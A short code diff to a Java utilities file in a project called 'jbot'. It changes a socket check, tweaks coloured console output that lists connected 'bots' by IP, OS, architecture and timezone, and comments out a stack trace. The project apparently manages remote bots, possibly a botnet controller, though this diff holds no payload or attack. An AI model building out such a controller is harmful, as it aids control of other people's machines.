@@ -5,6 +5,7 @@ import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
 import me.aaronakhtar.jbot.objects.Bot;
 import me.aaronakhtar.jbot.objects.ConnectionType;
 
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
@@ -25,16 +26,13 @@ public class Utilities {
         }
     }
 
-    public static boolean isSocketAlive(BufferedWriter writer){
+    public static boolean isSocketAlive(BufferedReader reader) {
         try{
-            for (int x = 0; x < 3; x++) {
-                writer.write(0 + "\n");
-                writer.flush();
-            }
-            return true;
+            return reader.read() != -1;
         }catch (Exception e){
-            return false;
+
         }
+        return false;
     }
 
     public static void closeSocket(Socket socket){
@@ -56,7 +54,7 @@ public class Utilities {
         switch (type){
             case BOT:{
 
-                System.out.println(Colour.BRIGHT_RED.get() + "[Bot] " + Colour.RESET.get() +
+                System.out.println(Colour.GREEN.get() + "[*] " +Colour.BRIGHT_RED.get() + "[Bot] " + Colour.RESET.get() +
                         "{ "+bot.getSocket().getInetAddress().getHostAddress()+" | "+bot.getOperatingSystem()+" | "+bot.getArchitecture()+" | "+bot.getTimezone()+" }");
                 return;
             }
@@ -74,6 +72,7 @@ public class Utilities {
 
     public static void handleException(Exception e){
         System.out.println(Colour.YELLOW.get() + "[ERROR] " + Colour.RED_BG.get() + e.getMessage() + Colour.RESET.get());
+       // e.printStackTrace();
     }
 
     public enum Colour {
